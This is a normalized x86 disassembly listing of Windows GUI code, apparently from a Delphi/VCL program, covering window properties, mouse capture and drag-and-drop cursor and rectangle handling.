mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43afa4
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43afd8
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044a0
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43afa4
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43b034
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43b218
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c0f4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404500
mov eax edi
mov edx esi
call sub_404034
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b25c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c0f4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404500
mov eax edi
mov edx esi
call sub_404034
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b2a0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_43f334
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43b31c
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
mov eax ebx
call sub_444968
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43b3c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_413a74
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43b3fc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43b424
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43b3fc
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43b3c8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413918
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413af0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b480
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_41394c
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413a74
mov edx 0x8
call sub_4026dc
inc esi
dec ebx
jne r-xdata
sub_43b4b4
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_413a74
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43b3c8
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43b518
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43b578
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031e0
mov edx esp
mov eax esi
call sub_404244
add esp 0x100
pop esi
pop ebx
retn
sub_43b5b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b67e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43c6d4
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43c05c
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43c05c
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43c6d4
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43c05c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43c6d4
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43b683
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e194
call sub_403a98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43c6d4
sub_43b6dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b706
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b76c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b518
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43b798
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_40348c
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43b7c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_40348c
xor edx edx
sub_43b81c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4465d0
sub_43b83c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4465b8
sub_43b860
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43b748
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cd6c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_423828
mov edx eax
mov eax esi
call sub_41cee8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_43b8c4
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_43b8f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b76c
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43b950
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_40348c
pop edi
pop esi
pop ebp
retn 0x4
sub_43b974
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43b998
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43b974
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43b974
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43ba54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43bac0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43bf10
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43afd8
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_444968
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_444968
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_444968
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_40348c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43ba54
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_444968
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_444968
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43bc58
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_444968
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_444968
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43bc9c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43b4b4
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43bac0
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_413a74
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_444968
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43bc58
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_40348c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_443498
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43b424
sub_43bdf8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413ad0
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413964
mov edx edi
mov eax [ rw-data ]
call sub_413918
jmp r-xdata
sub_43be58
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43beb0
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044a0
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43afa4
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43bf10
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43beb0
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43bf3c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43bc9c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43bf10
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43be58
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_444968
mov [ esi ] eax
sub_43bf8c
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43be58
cmp eax 0x1
sbb eax eax
inc eax
sub_43bfc8
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_443404
test eax eax
je r-xdata
mov eax esi
call sub_443404
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43c9f8
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_413a74
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413ad0
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_443418
mov edi eax
jmp r-xdata
sub_43c05c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43bf3c
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44648c
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43bf8c
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43bf8c
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43dc90
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43bf8c
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c0fc
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_446448
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43bfc8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_40348c
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_446574
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_44648c
jmp r-xdata
mov eax [ rw-data ]
call sub_4465e8
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c0fc
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43dc90
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_40348c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_40348c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407c70
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
